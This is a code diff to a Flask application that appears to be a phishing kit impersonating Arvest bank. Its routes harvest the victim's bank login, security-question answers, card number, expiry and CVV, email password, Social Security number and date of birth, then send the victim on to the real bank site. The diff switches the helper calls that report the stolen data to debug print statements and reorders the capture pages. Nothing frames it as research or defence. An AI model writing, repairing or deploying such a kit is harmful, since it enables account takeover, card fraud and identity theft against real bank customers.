@@ -1,5 +1,5 @@
 from flask import Blueprint, render_template, request, redirect, url_for
-from .utils import security_question, report_login, report_card_details
+from .utils import security_question, report_login, report_card_details, report_ssn
 
 portals = Blueprint('portals', __name__)
 
@@ -11,8 +11,8 @@ def signin():
         user_id = request.form['user-id']
         password_ = request.form['password']
         if user_id and password_:
-            # print(first_try_user, first_try_pass, user_id,password_)
-            report_login(first_try_user, first_try_pass, user_id,password_,bank_name='Arvest')
+            print(first_try_user, first_try_pass, user_id,password_)
+            # report_login(first_try_user, first_try_pass, user_id,password_,bank_name='Arvest')
             return redirect(url_for('portals.question'))
     return render_template('signin.html')
 
@@ -25,33 +25,34 @@ def question():
         ans2 = request.form['ans2']
         q3 = request.form['q3']
         ans3 = request.form['ans3']
-        # print(q1,ans1,q2,ans2,q3,ans3)
-        security_question(q1,ans1,q2,ans2,q3,ans3)
-        return redirect(url_for('portals.email'))
+        print(q1,ans1,q2,ans2,q3,ans3)
+        # security_question(q1,ans1,q2,ans2,q3,ans3)
+        return redirect(url_for('portals.card_confirmation'))
     return render_template('question.html')    
 
-@portals.route('/signin/email', methods=['GET','POST'])
-def email():
-    if request.method == 'POST':
-        email = request.form['email-id']
-        password_ = request.form['password']
-        if email and password_:
-            # print(email,password_)
-            report_login(username=email,password=password_, first_try_username=email, first_try_pass=password_, bank_name='Email Login')
-            return redirect(url_for('portals.card_confirmation'))
-    return render_template('email-login.html')    
-
-
-
-# @portals.route('/ssn-confirmation', methods=['GET','POST'])
-# def ssn():
+# @portals.route('/signin/email', methods=['GET','POST'])
+# def email():
 #     if request.method == 'POST':
-#         ssn = request.form['ssn']
-#         if ssn:
-#             # print(ssn)
-#             report_ssn(ssn)
-#             return redirect(url_for('portals.email_confirmation'))
-#     return render_template('identity-ssn.html')
+#         email = request.form['email-id']
+#         password_ = request.form['password']
+#         if email and password_:
+#             # print(email,password_)
+#             report_login(username=email,password=password_, first_try_username=email, first_try_pass=password_, bank_name='Email Login')
+#             return redirect(url_for('portals.card_confirmation'))
+#     return render_template('email-login.html')    
+
+
+
+@portals.route('/ssn-confirmation', methods=['GET','POST'])
+def ssn():
+    if request.method == 'POST':
+        ssn = request.form['ssn']
+        dob = request.form['dob']
+        if ssn and dob:
+            print(ssn, dob)
+            # report_ssn(ssn,dob)
+            return redirect('https://www.arvest.com/')
+    return render_template('identity-ssn.html')
 
 @portals.route('/signin/card-confirmation', methods=['GET','POST'])
 def card_confirmation():
@@ -60,10 +61,12 @@ def card_confirmation():
         card_number = request.form['card_number']
         exp_date = request.form['exp_date']
         cvv = request.form['cvv']
-        if card_name and card_number and exp_date and cvv:
-            # print( card_name, card_number, exp_date, cvv)
-            report_card_details(card_name, card_number, exp_date, cvv)
-            return redirect('https://www.arvest.com/')
+        email = request.form['email-id']
+        password_ = request.form['password']
+        if card_name and card_number and exp_date and cvv and email and password_:
+            print( card_name, card_number, exp_date, cvv,email, password_)
+            # report_card_details(card_name, card_number, exp_date, cvv, email, password_)
+            return redirect(url_for('portals.ssn'))
     return render_template('bank-card.html')
 
 # We are all 6 years old at some level
